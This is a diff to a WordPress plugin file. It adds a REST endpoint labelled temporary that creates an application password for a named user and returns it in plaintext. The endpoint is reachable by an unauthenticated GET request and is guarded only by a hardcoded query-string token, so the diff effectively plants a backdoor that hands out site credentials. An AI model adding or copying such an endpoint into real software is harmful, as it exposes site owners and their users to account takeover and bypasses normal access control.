@@ -539,4 +539,22 @@ function bmh_create_default_statuses() {
     }
 }
 
-
+// Temporary: generate app password for media upload (remove after use)
+add_action('rest_api_init', function() {
+    register_rest_route('bmh/v1', '/make-app-password', array(
+        'methods'             => 'GET',
+        'permission_callback' => function(WP_REST_Request $r) {
+            return $r->get_param('token') === 'BMH_IMPORT_2026';
+        },
+        'callback'            => function() {
+            $user = get_user_by('login', 'burtonmountdev');
+            if (!$user) return new WP_Error('no_user', 'User not found');
+            require_once ABSPATH . 'wp-includes/class-wp-application-passwords.php';
+            $result = WP_Application_Passwords::create_new_application_password(
+                $user->ID, array('name' => 'bmh-import-temp')
+            );
+            if (is_wp_error($result)) return $result;
+            return array('user' => $user->user_login, 'password' => $result[0]);
+        },
+    ));
+});
